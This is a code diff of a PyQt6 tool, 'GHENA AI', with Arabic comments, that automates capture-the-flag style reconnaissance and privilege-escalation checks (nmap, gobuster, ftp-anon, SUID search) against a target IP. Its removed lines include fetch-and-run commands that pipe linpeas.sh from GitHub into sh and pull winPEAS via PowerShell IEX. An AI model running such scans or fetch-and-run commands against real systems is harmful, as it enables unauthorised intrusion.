@@ -3,147 +3,128 @@ from PyQt6.QtWidgets import *
 from PyQt6.QtCore import QThread, pyqtSignal
 
 # ---------------------------------------------------------
-# المحرك التحليلي (The Brain) - يفهم الأهداف والأنظمة
+# محرك التنفيذ الحقيقي (Real Execution Engine)
 # ---------------------------------------------------------
-class GhenaStrategist:
-    def __init__(self):
-        self.os_type = "Unknown"  # Linux / Windows
-        self.current_goal = "Initial Access" # Root / User / Discovery
-        self.found_services = []
+class ExecutionWorker(QThread):
+    output_signal = pyqtSignal(str)
+    finished_signal = pyqtSignal()
 
-    def analyze_situation(self, nmap_output):
-        """يقرر نوع النظام والخدمات المتاحة"""
-        if "Microsoft" in nmap_output or "Windows" in nmap_output:
-            self.os_type = "Windows"
-        elif "Linux" in nmap_output or "Ubuntu" in nmap_output:
-            self.os_type = "Linux"
-        
-        # تحليل الخدمات
-        services = []
-        if "80/tcp" in nmap_output or "443/tcp" in nmap_output: services.append("Web")
-        if "445/tcp" in nmap_output: services.append("SMB")
-        if "22/tcp" in nmap_output: services.append("SSH")
-        self.found_services = services
-        return f"Detected System: {self.os_type} | Services: {', '.join(services)}"
+    def __init__(self, cmd):
+        super().__init__()
+        self.cmd = cmd
 
-    def get_next_move(self, target_ip, goal):
-        """يختار الأداة بناءً على الهدف والخدمات"""
-        self.current_goal = goal
-        decisions = []
-
-        if goal == "Get user.txt":
-            if "Web" in self.found_services:
-                decisions.append({
-                    "reason": "المنفذ 80 مفتوح، نحتاج اكتشاف المجلدات المخفية للوصول للمستخدم.",
-                    "tool": "Gobuster",
-                    "cmd": f"gobuster dir -u http://{target_ip}/ -w /usr/share/wordlists/dirb/common.txt -q"
-                })
-            if "SMB" in self.found_services:
-                decisions.append({
-                    "reason": "خدمة SMB مفعلة، ربما نجد ملفات مستخدم مسربة.",
-                    "tool": "Enum4Linux",
-                    "cmd": f"enum4linux -a {target_ip}"
-                })
-
-        elif goal == "Privilege Escalation":
-            if self.os_type == "Linux":
-                decisions.append({
-                    "reason": "نظام لينكس مكتشف، سنقوم بتشغيل LinPeas للبحث عن ثغرات الروت.",
-                    "tool": "LinPeas",
-                    "cmd": f"curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
-                })
-            else:
-                decisions.append({
-                    "reason": "نظام ويندوز مكتشف، سنبحث عن ملفات WinPeas أو صلاحيات غير مؤمنة.",
-                    "tool": "WinPeas",
-                    "cmd": f"powershell IEX (New-Object Net.WebClient).DownloadString('http://{target_ip}/winPEAS.ps1')"
-                })
-        
-        return decisions
+    def run(self):
+        # تنفيذ الأداة الحقيقية في كالي
+        process = subprocess.Popen(
+            self.cmd, shell=True, stdout=subprocess.PIPE, 
+            stderr=subprocess.STDOUT, text=True
+        )
+        for line in process.stdout:
+            self.output_signal.emit(line.strip())
+        process.wait()
+        self.finished_signal.emit()
 
 # ---------------------------------------------------------
-# الواجهة الذكية (Interactive Interface)
+# الواجهة الذكية (The Strategic Hub)
 # ---------------------------------------------------------
-class GhenaStrategistUI(QMainWindow):
+class GhenaStrategist(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("GHENA AI - The Strategist v30.0")
-        self.setMinimumSize(1100, 900)
-        self.brain = GhenaStrategist()
+        self.setWindowTitle("GHENA AI - Strategic Auto-Chain v33.0")
+        self.setMinimumSize(1000, 850)
         self.init_ui()
 
     def init_ui(self):
         layout = QVBoxLayout()
 
-        # قسم الإدخال والهدف
-        top_layout = QHBoxLayout()
-        self.ip_input = QLineEdit(); self.ip_input.setPlaceholderText("Target IP...")
+        # إدخال الهدف والـ IP
+        config_group = QGroupBox("Target Configuration")
+        config_layout = QHBoxLayout()
+        self.ip_input = QLineEdit(); self.ip_input.setPlaceholderText("Target IP (e.g. 10.113.174.41)")
         self.goal_selector = QComboBox()
-        self.goal_selector.addItems(["Initial Access", "Get user.txt", "Privilege Escalation", "Root Flag"])
-        top_layout.addWidget(QLabel("IP:")); top_layout.addWidget(self.ip_input)
-        top_layout.addWidget(QLabel("Goal:")); top_layout.addWidget(self.goal_selector)
-        layout.addLayout(top_layout)
+        self.goal_selector.addItems(["Initial Access (user.txt)", "Privilege Escalation (root.txt)"])
+        config_layout.addWidget(QLabel("IP:")); config_layout.addWidget(self.ip_input)
+        config_layout.addWidget(QLabel("Target Goal:")); config_layout.addWidget(self.goal_selector)
+        config_group.setLayout(config_layout)
+        layout.addWidget(config_group)
 
-        # زر التحليل
-        self.btn_analyze = QPushButton("🧠 ANALYZE & DECIDE"); self.btn_analyze.setFixedHeight(50)
-        self.btn_analyze.setStyleSheet("background: #2c3e50; color: white; font-weight: bold;")
-        layout.addWidget(self.btn_analyze)
+        # زر البدء الذكي
+        self.btn_launch = QPushButton("🚀 LAUNCH TARGETED ATTACK")
+        self.btn_launch.setFixedHeight(55)
+        self.btn_launch.setStyleSheet("background: #c0392b; color: white; font-weight: bold; font-size: 15px;")
+        layout.addWidget(self.btn_launch)
 
-        # منطقة عرض الأسباب والقرارات
-        self.decision_box = QTextEdit(); self.decision_box.setReadOnly(True); self.decision_box.setMaximumHeight(150)
-        self.decision_box.setStyleSheet("background: #fdf9e1; color: #7e4d0c; border: 1px solid #d4ac0d; font-size: 14px;")
-        layout.addWidget(QLabel("<b>AI Reasoning & Strategy:</b>")); layout.addWidget(self.decision_box)
+        # صندوق التحليل والسبب (Reasoning)
+        self.reason_box = QTextEdit(); self.reason_box.setReadOnly(True); self.reason_box.setMaximumHeight(100)
+        self.reason_box.setStyleSheet("background: #1a1a1a; color: #00ccff; border: 1px solid #00ccff; font-size: 13px;")
+        layout.addWidget(QLabel("<b>AI Reasoning & Strategy:</b>")); layout.addWidget(self.reason_box)
 
-        # الكونسول
+        # كونسول التنفيذ المباشر
         self.console = QTextEdit(); self.console.setReadOnly(True)
-        self.console.setStyleSheet("background: black; color: #00ff00; font-family: monospace;")
-        layout.addWidget(QLabel("<b>Execution Console:</b>")); layout.addWidget(self.console)
+        self.console.setStyleSheet("background: #000; color: #39ff14; font-family: 'Monospace'; font-size: 12px;")
+        layout.addWidget(QLabel("<b>Live Execution Console:</b>")); layout.addWidget(self.console)
 
         container = QWidget(); container.setLayout(layout); self.setCentralWidget(container)
-        self.btn_analyze.clicked.connect(self.run_strategy)
+        self.btn_launch.clicked.connect(self.start_phase_1)
 
     def log(self, text, color="#ffffff"):
         self.console.append(f"<font color='{color}'><b>{text}</b></font>")
 
-    def run_strategy(self):
+    # --- الخطوة 1: الفحص لتحديد المسار ---
+    def start_phase_1(self):
         ip = self.ip_input.text().strip()
-        goal = self.goal_selector.currentText()
         if not ip: return
-
-        # أولاً: فحص أولي إذا لم يكن لدينا بيانات
-        self.log(f"\n[!] Initiating Strategy for Goal: {goal}", "#3498db")
-        nmap_cmd = f"nmap -sV -Pn {ip}"
-        self.log(f"[EXECUTING]: {nmap_cmd}", "#e67e22")
+        self.console.clear()
+        self.reason_box.setText("💡 جاري فحص الخدمات المفتوحة لتحديد الأداة الأكثر فائدة للوصول للهدف...")
         
-        # محاكاة لعملية التحليل بناءً على مخرجات Nmap (بشكل مبسط للفهم)
-        # في الكود الحقيقي ستقوم بربط الـ Worker بـ analyze_situation
-        self.worker = ExecutionWorker(nmap_cmd)
+        # فحص الخدمات (مثل اللي سويته في صورتك)
+        cmd = f"nmap -sV -Pn {ip}"
+        self.log(f"\n[!] Phase 1: Service Discovery", "#3498db")
+        self.log(f"[EXECUTING]: {cmd}", "#e67e22")
+        
+        self.worker = ExecutionWorker(cmd)
         self.worker.output_signal.connect(self.console.append)
-        self.worker.finished_signal.connect(lambda: self.make_decisions(ip, goal))
+        # الانتقال التلقائي فور انتهاء Nmap
+        self.worker.finished_signal.connect(lambda: self.decide_and_run_phase_2(ip))
         self.worker.start()
 
-    def make_decisions(self, ip, goal):
-        # تحليل المخرجات (هنا نستخدم مخرجات الكونسول السابقة)
-        analysis_res = self.brain.analyze_situation(self.console.toPlainText())
-        self.decision_box.setText(f"💡 {analysis_res}")
+    # --- الخطوة 2: الانتقال التلقائي للأداة المطلوبة فقط ---
+    def decide_and_run_phase_2(self, ip):
+        output = self.console.toPlainText()
+        goal = self.goal_selector.currentText()
         
-        decisions = self.brain.get_next_move(ip, goal)
-        for d in decisions:
-            self.decision_box.append(f"\n➡️ [Decision]: {d['tool']}\n❓ [Reason]: {d['reason']}")
-            # تشغيل تلقائي أو يدوي حسب الرغبة
-            self.log(f"\n[AI RECOMMENDS]: {d['cmd']}", "#f1c40f")
+        self.log("\n[🧠] تحليل مخرجات Nmap لاختيار الأداة المطلوبة...", "#f1c40f")
 
-class ExecutionWorker(QThread):
-    output_signal = pyqtSignal(str)
-    finished_signal = pyqtSignal()
-    def __init__(self, cmd):
-        super().__init__(); self.cmd = cmd
-    def run(self):
-        p = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-        for line in p.stdout: self.output_signal.emit(line.strip())
-        p.wait(); self.finished_signal.emit()
+        # حالة الوصول الأولي (Initial Access)
+        if "Initial Access" in goal:
+            # التحقق من بورت 80 (الويب) - المسار الأسرع في Chill Hack
+            if "80/tcp open" in output or "http" in output:
+                reason = "اكتشفت منفذ ويب مفتوح (80). في هذا اللاب، الطريق الأقصر للوصول للمستخدم هو عبر فحص المجلدات المخفية. سأشغل Gobuster الآن."
+                self.reason_box.setText(f"🎯 {reason}")
+                next_cmd = f"gobuster dir -u http://{ip}/ -w /usr/share/wordlists/dirb/common.txt -q"
+                self.execute_next_tool("Web Discovery", next_cmd)
+            
+            # التحقق من بورت 21 (FTP) - مسار بديل إذا كان الويب غير مفيد
+            elif "21/tcp open" in output:
+                reason = "وجدنا بورت FTP مفتوح. سأفحص إذا كان يسمح بالدخول المجهول للحصول على بيانات المستخدم."
+                self.reason_box.setText(f"🎯 {reason}")
+                next_cmd = f"nmap --script ftp-anon -p 21 {ip}"
+                self.execute_next_tool("FTP Scan", next_cmd)
+
+        # حالة تصعيد الصلاحيات (Privilege Escalation)
+        elif "Privilege Escalation" in goal:
+            reason = "الهدف هو الروت. سأبحث عن ملفات SUID أو صلاحيات sudo المفتوحة فوراً."
+            self.reason_box.setText(f"🎯 {reason}")
+            self.execute_next_tool("PrivEsc Check", "find / -perm -4000 2>/dev/null")
+
+    def execute_next_tool(self, name, cmd):
+        self.log(f"\n[!] Phase 2: {name} (Auto-Triggered)", "#3498db")
+        self.log(f"[EXECUTING]: {cmd}", "#e67e22")
+        self.worker = ExecutionWorker(cmd)
+        self.worker.output_signal.connect(self.console.append)
+        self.worker.start()
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
-    window = GhenaStrategistUI(); window.show()
+    window = GhenaStrategist(); window.show()
     sys.exit(app.exec())
